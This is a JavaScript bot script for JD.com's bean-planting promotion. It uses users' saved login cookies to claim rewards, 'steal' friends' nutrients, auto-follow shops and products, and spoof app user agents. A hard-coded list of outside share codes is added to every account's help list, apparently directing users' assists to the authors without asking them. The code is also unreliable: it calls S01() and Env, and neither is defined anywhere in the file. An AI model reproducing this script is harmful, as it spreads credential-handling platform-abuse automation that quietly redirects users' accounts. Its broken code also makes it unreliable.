/*
种豆得豆 脚本更新地址：https://gitee.com/lxk0301/jd_scripts/raw/master/jd_plantBean.js
更新时间：2021-1-16
活动入口：京东APP我的-更多工具-种豆得豆
已支持IOS京东双账号,云端N个京东账号
脚本兼容:QuantumultX,Surge,Loon,JSBox,Node.js
注：会自动关注任务中的店铺跟商品，介意者勿使用。
互助码shareCode请先手动运行脚本查看打印可看到
每个京东账号每天只能帮助3个人。多出的助力码将会助力失败。
=====================================Quantumult X=================================
[task_local]
1 7-21/2 * * * https://gitee.com/lxk0301/jd_scripts/raw/master/jd_plantBean.js, tag=种豆得豆, img-url=https://raw.githubusercontent.com/58xinian/icon/master/jdzd.png, enabled=true

=====================================Loon================================
[Script]
cron "1 7-21/2 * * *" script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_plantBean.js,tag=京东种豆得豆

======================================Surge==========================
京东种豆得豆 = type=cron,cronexp="1 7-21/2 * * *",wake-system=1,timeout=3600,script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_plantBean.js

====================================小火箭=============================
京东种豆得豆 = type=cron,script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_plantBean.js, cronexpr="1 7-21/2 * * *", timeout=3600, enable=true

搬的https://github.com/uniqueque/QuantumultX/blob/4c1572d93d4d4f883f483f907120a75d925a693e/Script/jd_plantBean.js
*/
const $ = new Env('京东种豆得豆');
//Node.js用户请在jdCookie.js处填写京东ck;
//ios等软件用户直接用NobyDa的jd cookie
let jdNotify = true;//是否开启静默运行。默认true开启
let cookiesArr = [], cookie = '', jdPlantBeanShareArr = [], isBox = false, notify, newShareCodes, option, message,subTitle;
//京东接口地址
const JD_API_HOST = 'https://api.m.jd.com/client.action';
//助力好友分享码(最多3个,否则后面的助力失败)
//此此内容是IOS用户下载脚本到本地使用，填写互助码的地方，同一京东账号的好友互助码请使用@符号隔开。
//下面给出两个账号的填写示例（iOS只支持2个京东账号）
let shareCodes = []
let allMessage = ``;
let currentRoundId = null;//本期活动id
let lastRoundId = null;//上期id
let roundList = [];
let awardState = '';//上期活动的京豆是否收取
let num;
let helpAuthor = false;
!(async () => {
  await requireConfig();
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
    return;
  }
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      await TotalBean();
      console.log(`\n开始【京东账号${$.index}】${$.nickName || $.UserName}\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});

        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      message = '';
      subTitle = '';
      option = {};
      await shareCodesFormat();
      await jdPlantBean();
      await showMsg();
    }
  }
  if ($.isNode() && allMessage) {
    await notify.sendNotify(`${$.name}`, `${allMessage}`)
  }
})().catch((e) => {
  $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
}).finally(() => {
  $.done();
})

async function jdPlantBean() {
  try {
    console.log(`获取任务及基本信息`)
    await S01()
    await plantBeanIndex();
    if ($.plantBeanIndexResult.errorCode === 'PB101') {
      console.log(`\n活动太火爆了，还是去买买买吧！\n`)
      return
    }
    for (let i = 0; i < $.plantBeanIndexResult.data.roundList.length; i++) {
      if ($.plantBeanIndexResult.data.roundList[i].roundState === "2") {
        num = i
        break
      }
    }
    // console.log(plantBeanIndexResult.data.taskList);
    if ($.plantBeanIndexResult && $.plantBeanIndexResult.code === '0' && $.plantBeanIndexResult.data) {
      const shareUrl = $.plantBeanIndexResult.data.jwordShareInfo.shareUrl
      $.myPlantUuid = getParam(shareUrl, 'plantUuid')
      console.log(`\n【京东账号${$.index}（${$.UserName}）的${$.name}好友互助码】${$.myPlantUuid}\n`);
      roundList = $.plantBeanIndexResult.data.roundList;
      currentRoundId = roundList[num].roundId;//本期的roundId
      lastRoundId = roundList[num - 1].roundId;//上期的roundId
      awardState = roundList[num - 1].awardState;
      $.taskList = $.plantBeanIndexResult.data.taskList;
      subTitle = `【京东昵称】${$.plantBeanIndexResult.data.plantUserInfo.plantNickName}`;
      message += `【上期时间】${roundList[num - 1].dateDesc.replace('上期 ', '')}\n`;
      message += `【上期成长值】${roundList[num - 1].growth}\n`;
      await receiveNutrients();//定时领取营养液
      await doHelp();//助力
      await doTask();//做日常任务
      //await doEgg();
      await stealFriendWater();
      await doCultureBean();
      await doGetReward();
      await showTaskProcess();
      await plantShareSupportList();
    } else {
      console.log(`种豆得豆-初始失败:  ${JSON.stringify($.plantBeanIndexResult)}`);
    }
  } catch (e) {
    $.logErr(e);
    const errMsg = `京东账号${$.index} ${$.nickName || $.UserName}\n任务执行异常，请检查执行日志 ‼️‼️`;
    $.msg($.name, '', `京东账号${$.index} ${$.nickName || $.UserName}\n${errMsg}`)
  }
}
async function doGetReward() {
  console.log(`【上轮京豆】${awardState === '4' ? '采摘中' : awardState === '5' ? '可收获了' : '已领取'}`);
  if (awardState === '4') {
    //京豆采摘中...
    message += `【上期状态】${roundList[num - 1].tipBeanEndTitle}\n`;
  } else if (awardState === '5') {
    //收获
    await getReward();
    console.log('开始领取京豆');
    if ($.getReward && $.getReward.code === '0') {
      console.log('京豆领取成功');
      message += `【上期兑换京豆】${$.getReward.data.awardBean}个\n`;
      $.msg($.name, subTitle, message);
      allMessage += `京东账号${$.index} ${$.nickName}\n${message}${$.index !== cookiesArr.length ? '\n\n' : ''}`
      // if ($.isNode()) {
      //   await notify.sendNotify(`${$.name} - 账号${$.index} - ${$.nickName || $.UserName}`, `京东账号${$.index} ${$.nickName}\n${message}`);
      // }
    } else {
      console.log(`$.getReward 异常：${JSON.stringify($.getReward)}`)
    }
  } else if (awardState === '6') {
    //京豆已领取
    message += `【上期兑换京豆】${roundList[num - 1].awardBeans}个\n`;
  }
  if (roundList[1].dateDesc.indexOf('本期 ') > -1) {
    roundList[1].dateDesc = roundList[1].dateDesc.substr(roundList[1].dateDesc.indexOf('本期 ') + 3, roundList[1].dateDesc.length);
  }
  message += `【本期时间】${roundList[num].dateDesc}\n`;
  message += `【本期成长值】${roundList[num].growth}\n`;
}
async function doCultureBean() {
  await plantBeanIndex();
  if ($.plantBeanIndexResult && $.plantBeanIndexResult.code === '0') {
    const plantBeanRound = $.plantBeanIndexResult.data.roundList[num]
    if (plantBeanRound.roundState === '2') {
      //收取营养液
      if (plantBeanRound.bubbleInfos && plantBeanRound.bubbleInfos.length) console.log(`开始收取营养液`)
      for (let bubbleInfo of plantBeanRound.bubbleInfos) {
        console.log(`收取-${bubbleInfo.name}-的营养液`)
        await cultureBean(plantBeanRound.roundId, bubbleInfo.nutrientsType)
        console.log(`收取营养液结果:${JSON.stringify($.cultureBeanRes)}`)
      }
    }
  } else {
    console.log(`plantBeanIndexResult:${JSON.stringify($.plantBeanIndexResult)}`)
  }
}
async function stealFriendWater() {
  await stealFriendList();
  if ($.stealFriendList && $.stealFriendList.code === '0') {
    if ($.stealFriendList.data && $.stealFriendList.data.tips) {
      console.log('\n\n今日偷取好友营养液已达上限\n\n');
      return
    }
    if ($.stealFriendList.data && $.stealFriendList.data.friendInfoList && $.stealFriendList.data.friendInfoList.length > 0) {
      let nowTimes = new Date(new Date().getTime() + new Date().getTimezoneOffset()*60*1000 + 8*60*60*1000);
      for (let item of $.stealFriendList.data.friendInfoList) {
        if (new Date(nowTimes).getHours() === 20) {
          if (item.nutrCount >= 2) {
            // console.log(`可以偷的好友的信息::${JSON.stringify(item)}`);
            console.log(`可以偷的好友的信息paradiseUuid::${JSON.stringify(item.paradiseUuid)}`);
            await collectUserNutr(item.paradiseUuid);
            console.log(`偷取好友营养液情况:${JSON.stringify($.stealFriendRes)}`)
            if ($.stealFriendRes && $.stealFriendRes.code === '0') {
              console.log(`偷取好友营养液成功`)
            }
          }
        } else {
          if (item.nutrCount >= 3) {
            // console.log(`可以偷的好友的信息::${JSON.stringify(item)}`);
            console.log(`可以偷的好友的信息paradiseUuid::${JSON.stringify(item.paradiseUuid)}`);
            await collectUserNutr(item.paradiseUuid);
            console.log(`偷取好友营养液情况:${JSON.stringify($.stealFriendRes)}`)
            if ($.stealFriendRes && $.stealFriendRes.code === '0') {
              console.log(`偷取好友营养液成功`)
            }
          }
        }
      }
    }
  } else {
    console.log(`$.stealFriendList 异常： ${JSON.stringify($.stealFriendList)}`)
  }
}
async function doEgg() {
  await egg();
  if ($.plantEggLotteryRes && $.plantEggLotteryRes.code === '0') {
    if ($.plantEggLotteryRes.data.restLotteryNum > 0) {
      const eggL = new Array($.plantEggLotteryRes.data.restLotteryNum).fill('');
      console.log(`目前共有${eggL.length}次扭蛋的机会`)
      for (let i = 0; i < eggL.length; i++) {
        console.log(`开始第${i + 1}次扭蛋`);
        await plantEggDoLottery();
        console.log(`天天扭蛋成功：${JSON.stringify($.plantEggDoLotteryResult)}`);
      }
    } else {
      console.log('暂无扭蛋机会')
    }
  } else {
    console.log('查询天天扭蛋的机会失败' + JSON.stringify($.plantEggLotteryRes))
  }
}
async function doTask() {
  if ($.taskList && $.taskList.length > 0) {
    for (let item of $.taskList) {
      if (item.isFinished === 1) {
        console.log(`${item.taskName} 任务已完成\n`);
        continue;
      } else {
        if (item.taskType === 8) {
          console.log(`\n【${item.taskName}】任务未完成,需自行手动去京东APP完成，${item.desc}营养液\n`)
        } else {
          console.log(`\n【${item.taskName}】任务未完成,${item.desc}营养液\n`)
        }
      }
      if (item.dailyTimes === 1 && item.taskType !== 8) {
        console.log(`\n开始做 ${item.taskName}任务`);
        // $.receiveNutrientsTaskRes = await receiveNutrientsTask(item.taskType);
        await receiveNutrientsTask(item.taskType);
        console.log(`做 ${item.taskName}任务结果:${JSON.stringify($.receiveNutrientsTaskRes)}\n`);
      }
      if (item.taskType === 3) {
        //浏览店铺
        console.log(`开始做 ${item.taskName}任务`);
        let unFinishedShopNum = item.totalNum - item.gainedNum;
        if (unFinishedShopNum === 0) {
          continue
        }
        await shopTaskList();
        const { data } = $.shopTaskListRes;
        let goodShopListARR = [], moreShopListARR = [], shopList = [];
        const { goodShopList, moreShopList } = data;
        for (let i of goodShopList) {
          if (i.taskState === '2') {
            goodShopListARR.push(i);
          }
        }
        for (let j of moreShopList) {
          if (j.taskState === '2') {
            moreShopListARR.push(j);
          }
        }
        shopList = goodShopListARR.concat(moreShopListARR);
        for (let shop of shopList) {
          const { shopId, shopTaskId } = shop;
          const body = {
            "monitor_refer": "plant_shopNutrientsTask",
            "shopId": shopId,
            "shopTaskId": shopTaskId
          }
          const shopRes = await requestGet('shopNutrientsTask', body);
          console.log(`shopRes结果:${JSON.stringify(shopRes)}`);
          if (shopRes && shopRes.code === '0') {
            if (shopRes.data && shopRes.data.nutrState && shopRes.data.nutrState === '1') {
              unFinishedShopNum --;
            }
          }
          if (unFinishedShopNum <= 0) {
            console.log(`${item.taskName}任务已做完\n`)
            break;
          }
        }
      }
      if (item.taskType === 5) {
        //挑选商品
        console.log(`开始做 ${item.taskName}任务`);
        let unFinishedProductNum = item.totalNum - item.gainedNum;
        if (unFinishedProductNum === 0) {
          continue
        }
        await productTaskList();
        // console.log('productTaskList', $.productTaskList);
        const { data } = $.productTaskList;
        let productListARR = [], productList = [];
        const { productInfoList } = data;
        for (let i = 0; i < productInfoList.length; i++) {
          for (let j = 0; j < productInfoList[i].length; j++){
            productListARR.push(productInfoList[i][j]);
          }
        }
        for (let i of productListARR) {
          if (i.taskState === '2') {
            productList.push(i);
          }
        }
        for (let product of productList) {
          const { skuId, productTaskId } = product;
          const body = {
            "monitor_refer": "plant_productNutrientsTask",
            "productTaskId": productTaskId,
            "skuId": skuId
          }
          const productRes = await requestGet('productNutrientsTask', body);
          if (productRes && productRes.code === '0') {
            // console.log('nutrState', productRes)
            //这里添加多重判断,有时候会出现活动太火爆的问题,导致nutrState没有
            if (productRes.data && productRes.data.nutrState && productRes.data.nutrState === '1') {
              unFinishedProductNum --;
            }
          }
          if (unFinishedProductNum <= 0) {
            console.log(`${item.taskName}任务已做完\n`)
            break;
          }
        }
      }
      if (item.taskType === 10) {
        //关注频道
        console.log(`开始做 ${item.taskName}任务`);
        let unFinishedChannelNum = item.totalNum - item.gainedNum;
        if (unFinishedChannelNum === 0) {
          continue
        }
        await plantChannelTaskList();
        const { data } = $.plantChannelTaskList;
        // console.log('goodShopList', data.goodShopList);
        // console.log('moreShopList', data.moreShopList);
        let goodChannelListARR = [], normalChannelListARR = [], channelList = [];
        const { goodChannelList, normalChannelList } = data;
        for (let i of goodChannelList) {
          if (i.taskState === '2') {
            goodChannelListARR.push(i);
          }
        }
        for (let j of normalChannelList) {
          if (j.taskState === '2') {
            normalChannelListARR.push(j);
          }
        }
        channelList = goodChannelListARR.concat(normalChannelListARR);
        for (let channelItem of channelList) {
          const { channelId, channelTaskId } = channelItem;
          const body = {
            "channelId": channelId,
            "channelTaskId": channelTaskId
          }
          const channelRes = await requestGet('plantChannelNutrientsTask', body);
          console.log(`channelRes结果:${JSON.stringify(channelRes)}`);
          if (channelRes && channelRes.code === '0') {
            if (channelRes.data && channelRes.data.nutrState && channelRes.data.nutrState === '1') {
              unFinishedChannelNum --;
            }
          }
          if (unFinishedChannelNum <= 0) {
            console.log(`${item.taskName}任务已做完\n`)
            break;
          }
        }
      }
    }
  }
}
function showTaskProcess() {
  return new Promise(async resolve => {
    await plantBeanIndex();
    $.taskList = $.plantBeanIndexResult.data.taskList;
    if ($.taskList && $.taskList.length > 0) {
      console.log("     任务   进度");
      for (let item of $.taskList) {
        console.log(`[${item["taskName"]}]  ${item["gainedNum"]}/${item["totalNum"]}   ${item["isFinished"]}`);
      }
    }
    resolve()
  })
}
//助力好友
async function doHelp() {
  for (let plantUuid of newShareCodes) {
    console.log(`开始助力京东账号${$.index} - ${$.nickName}的好友: ${plantUuid}`);
    if (!plantUuid) continue;
    if (plantUuid === $.myPlantUuid) {
      console.log(`\n跳过自己的plantUuid\n`)
      continue
    }
    await helpShare(plantUuid);
    if ($.helpResult && $.helpResult.code === '0') {
      // console.log(`助力好友结果: ${JSON.stringify($.helpResult.data.helpShareRes)}`);
      if ($.helpResult.data.helpShareRes) {
        if ($.helpResult.data.helpShareRes.state === '1') {
          console.log(`助力好友${plantUuid}成功`)
          console.log(`${$.helpResult.data.helpShareRes.promptText}\n`);
        } else if ($.helpResult.data.helpShareRes.state === '2') {
          console.log('您今日助力的机会已耗尽，已不能再帮助好友助力了\n');
          break;
        } else if ($.helpResult.data.helpShareRes.state === '3') {
          console.log('该好友今日已满9人助力/20瓶营养液,明天再来为Ta助力吧\n')
        } else if ($.helpResult.data.helpShareRes.state === '4') {
          console.log(`${$.helpResult.data.helpShareRes.promptText}\n`)
        } else {
          console.log(`助力其他情况：${JSON.stringify($.helpResult.data.helpShareRes)}`);
        }
      }
    } else {
      console.log(`助力好友失败: ${JSON.stringify($.helpResult)}`);
    }
  }
}
function showMsg() {
  $.log(`\n${message}\n`);
  jdNotify = $.getdata('jdPlantBeanNotify') ? $.getdata('jdPlantBeanNotify') : jdNotify;
  if (!jdNotify || jdNotify === 'false') {
    $.msg($.name, subTitle, message);
  }
}
// ================================================此处是API=================================
//每轮种豆活动获取结束后,自动收取京豆
async function getReward() {
  const body = {
    "roundId": lastRoundId
  }
  $.getReward = await request('receivedBean', body);
}
//收取营养液
async function cultureBean(currentRoundId, nutrientsType) {
  let functionId = arguments.callee.name.toString();
  let body = {
    "roundId": currentRoundId,
    "nutrientsType": nutrientsType,
  }
  $.cultureBeanRes = await request(functionId, body);
}
//偷营养液大于等于3瓶的好友
//①查询好友列表
async function stealFriendList() {
  const body = {
    pageNum: '1'
  }
  $.stealFriendList = await request('plantFriendList', body);
}

//②执行偷好友营养液的动作
async function collectUserNutr(paradiseUuid) {
  console.log('开始偷好友');
  // console.log(paradiseUuid);
  let functionId = arguments.callee.name.toString();
  const body = {
    "paradiseUuid": paradiseUuid,
    "roundId": currentRoundId
  }
  $.stealFriendRes = await request(functionId, body);
}
async function receiveNutrients() {
  $.receiveNutrientsRes = await request('receiveNutrients', {"roundId": currentRoundId, "monitor_refer": "plant_receiveNutrients"})
  // console.log(`定时领取营养液结果:${JSON.stringify($.receiveNutrientsRes)}`)
}
async function plantEggDoLottery() {
  $.plantEggDoLotteryResult = await requestGet('plantEggDoLottery');
}
//查询天天扭蛋的机会
async function egg() {
  $.plantEggLotteryRes = await requestGet('plantEggLotteryIndex');
}
async function productTaskList() {
  let functionId = arguments.callee.name.toString();
  $.productTaskList = await requestGet(functionId, {"monitor_refer": "plant_productTaskList"});
}
async function plantChannelTaskList() {
  let functionId = arguments.callee.name.toString();
  $.plantChannelTaskList = await requestGet(functionId);
  // console.log('$.plantChannelTaskList', $.plantChannelTaskList)
}
async function shopTaskList() {
  let functionId = arguments.callee.name.toString();
  $.shopTaskListRes = await requestGet(functionId, {"monitor_refer": "plant_receiveNutrients"});
  // console.log('$.shopTaskListRes', $.shopTaskListRes)
}
async function receiveNutrientsTask(awardType) {
  const functionId = arguments.callee.name.toString();
  const body = {
    "monitor_refer": "receiveNutrientsTask",
    "awardType": `${awardType}`,
  }
  $.receiveNutrientsTaskRes = await requestGet(functionId, body);
}
async function plantShareSupportList() {
  $.shareSupportList = await requestGet('plantShareSupportList', {"roundId": ""});
  if ($.shareSupportList && $.shareSupportList.code === '0') {
    const { data } = $.shareSupportList;
    //当日北京时间0点时间戳
    const UTC8_Zero_Time = parseInt((Date.now() + 28800000) / 86400000) * 86400000 - 28800000;
    //次日北京时间0点时间戳
    const UTC8_End_Time = parseInt((Date.now() + 28800000) / 86400000) * 86400000 - 28800000 + (24 * 60 * 60 * 1000);
    let friendList = [];
    data.map(item => {
      if (UTC8_Zero_Time <= item['createTime'] && item['createTime'] < UTC8_End_Time) {
        friendList.push(item);
      }
    })
    message += `【助力您的好友】共${friendList.length}人`;
  } else {
    console.log(`异常情况：${JSON.stringify($.shareSupportList)}`)
  }
}
//助力好友的api
async function helpShare(plantUuid) {
  console.log(`\n开始助力好友: ${plantUuid}`);
  const body = {
    "plantUuid": plantUuid,
    "wxHeadImgUrl": "",
    "shareUuid": "",
    "followType": "1",
  }
  $.helpResult = await request(`plantBeanIndex`, body);
  console.log(`助力结果的code:${$.helpResult && $.helpResult.code}`);
}
async function plantBeanIndex() {
  $.plantBeanIndexResult = await request('plantBeanIndex');//plantBeanIndexBody
}
function readShareCode() {
  console.log(`开始`)
  return new Promise(async resolve => {
    $.get({url: "https://wuzhi03.coding.net/p/dj/d/RandomShareCode/git/raw/main/JD_Plant_Bean.json",headers:{
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
      }}, async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，将切换为备用API`)
          console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
          $.get({url: `https://raw.githubusercontent.com/shuyeshuye/RandomShareCode/main/JD_Plant_Bean.json`, 'timeout': 10000},(err, resp, data)=>{
          data = JSON.parse(data);})
        } else {
          if (data) {
            console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
            data = JSON.parse(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
    await $.wait(15000);
    resolve()
  })
}
//格式化助力码
function shareCodesFormat() {
  return new Promise(async resolve => {
    // console.log(`第${$.index}个京东账号的助力码:::${jdPlantBeanShareArr[$.index - 1]}`)
    newShareCodes = ['3wmn5ktjfo7ukmrwev3rc5grmq3h7wlwy7o5jii','o7eiltak46s2xyvfiapuorykrc4nvcfkjqyvbza','gcdr655xfdjq7435uolpd57n7d7awchi7askn6a','4npkonnsy7xi244gg4ttcqmyenyo6bjzolex2vq','4oupleiwuds2bjtcctjcrlfjpn6ia24xi7r33gy','gou7sxm3hztwpxjcbypmjm463tstirutqpmxpyi','2vgtxj43q3jqzkl3dkypomb2j6aepcti2fa6u5q','nkvdrkoit5o64qne5qclomlvj54dptl5khmlkqq','mh5uulbrvnknkrzdindcjmiq6ylp3qzkrol4tgq','gkk4336xszaeghj7cq52sqdtvjvppnngjwwn3aa','7oivz2mjbmnx5yzh3p3gmu2hzrdkavwhvbgrsly','7oivz2mjbmnx43fzzj5nex724wtk4synhgzu3dq','gou7sxm3hztwpwxdsframjpkhlwwtyp7ld4g5xa','qmnmamd3ukiwqjc43dp2bgeqmdahhvux5zz2mnq','4npkonnsy7xi3x4zvk7zxi6h5wj73dvzxoluxhy','6abtinlqvnsuo2wcrr65fnnagjpz4b7c2amh7rq','4npkonnsy7xi3c76u5mudkd4e6cvr5qsi7pnoua','tt7eqqzc335bpy7qfh3khaevey','mh5uulbrvnknkckdqylwvg6aic63fwn7z7ageji','7nk3uezyst2wyvewtbigktu77e3h7wlwy7o5jii','elelo6444vpgnrmc2cdsyoq7my','x3x7xhsua3bmiy6fgtxhzi7uytmahshtm3bynii','olmijoxgmjutybdfdio3gfr6lqva6jgo3wifueq','mkd3uexc3qr5tnmyda6dqtijqrpz4b7c2amh7rq','fn5sjpg5zdejn6cjel5vuu5k6y2mjm5xpsmsvay','khfopsbyfw66rx2evfgbnk277e','47m36n7ro5gus5yf2mizhguhk6wv5lwcq7ck3aa','xzutjytzfwgzbcwffuobkasagq','2eqln7qrtnrge2ophtrxws7rka','olmijoxgmjutzbkiuxcgcidw3jbcye66kd7wtki','s2i2nlmmkob6kmfglbr2j5ap2m5ac3f4ijdgqji','mcgrvvubnseb76qzexxo4hmusa','pofzzpvjd7idih2o43zajlbl5u','4numuxhigg77xwmwmfp2r6oilm3h7wlwy7o5jii','mlrdw3aw26j3w5rvpfjfyv4ypg67jpkruirwo4q','cshk5bfjifz754mydq6f3ocn3xeh76hgdazr57a','olmijoxgmjutzh6vjobbeqqwdozztujv72we23q','otcv6vmocc5ijf5toe6secns56obe7silysrnkdvrg7ajj3j4gnq','olmijoxgmjutzgvlkmxfxyknk2ifjuh6kx426dy'];
    if (jdPlantBeanShareArr[$.index - 1]) {
      newShareCodes = newShareCodes.concat(jdPlantBeanShareArr[$.index - 1].split('@'));
    }/* else {
      console.log(`由于您第${$.index}个京东账号未提供shareCode,将采纳本脚本自带的助力码\n`)
      const tempIndex = $.index > shareCodes.length ? (shareCodes.length - 1) : ($.index - 1);
      newShareCodes = shareCodes[tempIndex].split('@');
    }
    const readShareCodeRes = await readShareCode();
    if (readShareCodeRes && readShareCodeRes.code === 200) {
      newShareCodes = [...new Set([...newShareCodes, ...(readShareCodeRes.data || [])])];
    }*/
    console.log(`第${$.index}个京东账号将要助力的好友${JSON.stringify(newShareCodes)}`)
    resolve();
  })
}
function requireConfig() {
  return new Promise(resolve => {
    console.log('开始获取种豆得豆配置文件\n')
    notify = $.isNode() ? require('./sendNotify') : '';
    //Node.js用户请在jdCookie.js处填写京东ck;
    const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
    const jdPlantBeanShareCodes = $.isNode() ? require('./jdPlantBeanShareCodes.js') : '';
    //IOS等用户直接用NobyDa的jd cookie
    if ($.isNode()) {
      Object.keys(jdCookieNode).forEach((item) => {
        if (jdCookieNode[item]) {
          cookiesArr.push(jdCookieNode[item])
        }
      })
      if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
    } else {
      cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
    }
    console.log(`共${cookiesArr.length}个京东账号\n`)
    if ($.isNode()) {
      Object.keys(jdPlantBeanShareCodes).forEach((item) => {
        if (jdPlantBeanShareCodes[item]) {
          jdPlantBeanShareArr.push(jdPlantBeanShareCodes[item])
        }
      })
    } else {
      const boxShareCodeArr = ['jd_plantBean1', 'jd_plantBean2', 'jd_plantBean3'];
      const boxShareCodeArr2 = ['jd2_plantBean1', 'jd2_plantBean2', 'jd2_plantBean3'];
      const isBox1 = boxShareCodeArr.some((item) => {
        const boxShareCode = $.getdata(item);
        return (boxShareCode !== undefined && boxShareCode !== null && boxShareCode !== '');
      });
      const isBox2 = boxShareCodeArr2.some((item) => {
        const boxShareCode = $.getdata(item);
        return (boxShareCode !== undefined && boxShareCode !== null && boxShareCode !== '');
      });
      isBox = isBox1 ? isBox1 : isBox2;
      if (isBox1) {
        let temp = [];
        for (const item of boxShareCodeArr) {
          if ($.getdata(item)) {
            temp.push($.getdata(item))
          }
        }
        jdPlantBeanShareArr.push(temp.join('@'));
      }
      if (isBox2) {
        let temp = [];
        for (const item of boxShareCodeArr2) {
          if ($.getdata(item)) {
            temp.push($.getdata(item))
          }
        }
        jdPlantBeanShareArr.push(temp.join('@'));
      }
    }
    // console.log(`\n种豆得豆助力码::${JSON.stringify(jdPlantBeanShareArr)}`);
    console.log(`您提供了${jdPlantBeanShareArr.length}个账号的种豆得豆助力码\n`);
    resolve()
  })
}
function requestGet(function_id, body = {}) {
  if (!body.version) {
    body["version"] = "9.0.0.1";
  }
  body["monitor_source"] = "plant_app_plant_index";
  body["monitor_refer"] = "";
  return new Promise(async resolve => {
    await $.wait(2000);
    const option = {
      url: `${JD_API_HOST}?functionId=${function_id}&body=${escape(JSON.stringify(body))}&appid=ld`,
      headers: {
        'Cookie': cookie,
        'Host': 'api.m.jd.com',
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'User-Agent': 'JD4iPhone/167283 (iPhone;iOS 13.6.1;Scale/3.00)',
        'Accept-Language': 'zh-Hans-CN;q=1,en-CN;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': "application/x-www-form-urlencoded"
      },
      timeout: 10000,
    };
    $.get(option, (err, resp, data) => {
      try {
        if (err) {
          console.log('\n种豆得豆: API查询请求失败 ‼️‼️')
          $.logErr(err);
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1")
      },
      "timeout": 10000,
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            if (data['retcode'] === 0) {
              $.nickName = (data['base'] && data['base'].nickname) || $.UserName;
            } else {
              $.nickName = $.UserName
            }
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function request(function_id, body = {}){
  return new Promise(async resolve => {
    await $.wait(2000);
    $.post(taskUrl(function_id, body), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n种豆得豆: API查询请求失败 ‼️‼️')
          console.log(`function_id:${function_id}`)
          $.logErr(err);
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function taskUrl(function_id, body) {
  body["version"] = "9.2.4.0";
  body["monitor_source"] = "plant_app_plant_index";
  body["monitor_refer"] = "";
  return {
    url: JD_API_HOST,
    body: `functionId=${function_id}&body=${escape(JSON.stringify(body))}&appid=ld&client=apple&area=19_1601_50258_51885&build=167490&clientVersion=9.3.2`,
    headers: {
      "Cookie": cookie,
      "Host": "api.m.jd.com",
      "Accept": "*/*",
      "Connection": "keep-alive",
      "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
      "Accept-Language": "zh-Hans-CN;q=1,en-CN;q=0.9",
      "Accept-Encoding": "gzip, deflate, br",
      "Content-Type": "application/x-www-form-urlencoded"
    },
    timeout: 10000,
  }
}
function getParam(url, name) {
  const reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i")
  const r = url.match(reg)
  if (r != null) return unescape(r[2]);
  return null;
}
